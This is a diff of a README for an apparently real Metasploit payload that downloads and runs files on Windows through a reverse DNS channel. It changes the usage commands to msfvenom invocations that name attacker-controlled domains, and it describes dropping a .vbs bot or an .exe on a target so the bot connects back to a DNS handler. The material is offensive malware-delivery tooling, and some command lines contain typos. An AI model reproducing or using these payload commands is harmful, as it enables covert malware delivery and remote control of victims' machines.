@@ -3,17 +3,17 @@ Reverse DNS payload for Metasploit: Download  Exec x86 shellcode. Also DNS Handl
 
 ## Components
 
-### dnsshellcode.rb
+### dns_download_exec_svchost.rb
 
 Metasploit payload: X86 download and exec via reverse DNS channel. Jut put this file into msf3 payload folder and then you could use it like that:
 
-    msfpayload windows/dnsshell DOMAIN=a.dom.ws EXT=exe J | sed -s 's/\%/\\/g'
+     mssfvenom -p windows/dns_download_exec_svchost DOMAIN=a.0x41.ws EXT=vbs -f js_le | sed -s 's/\%/\\/g'
 
 DOMAIN - domain you should control (NS).
 
 EXT - file extension
 
-This payload are using getaddrinfo API function for getting data over DNS (to %temp% dir). This shellcod will work even on boxes without IPv6 assigned.
+This payload are using getaddrinfo API function for getting data over DNS (to %temp% dir). This shellcode will work even on boxes without IPv6 assigned (my previos one - https://www.exploit-db.com/exploits/17326/ did not!). 
 For that all resolved IPv6 addresses should be from reserved block. This shellcode uses IPv6 in ranges from ff00:: to ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
 
 those IPv6 will be resolve even if no IPv6 address assigned to the interface (only linked). First byte should be ff, than second is control byte that tell us
@@ -92,11 +92,11 @@ So now it "stores" two files in a.zlo.ws and in b.zlo.ws
 
 If you want shellcode download and exec bot.vbs
  
-        msfpayload windows/dnsshell DOMAIN=a.dom.ws EXT=vbs C
+        mssfvenom -p windows/dns_download_exec_svchost DOMAIN=a.0x41.ws EXT=vbs -f js_le
         
 If you want shellcode download and exec drop.exe
  
-        msfpayload windows/dnsshell DOMAIN=b.dom.ws EXT=vbs C
+        mssfvenom -p windows/dns_download_exec_svchost DOMAIN=b.0x41.ws EXT=exe -f js_le
         
 9) Run exploit with shellocde on target box, and then (if bot.vbs used) wait when BOT from the box will be connected to revdns.pl
 
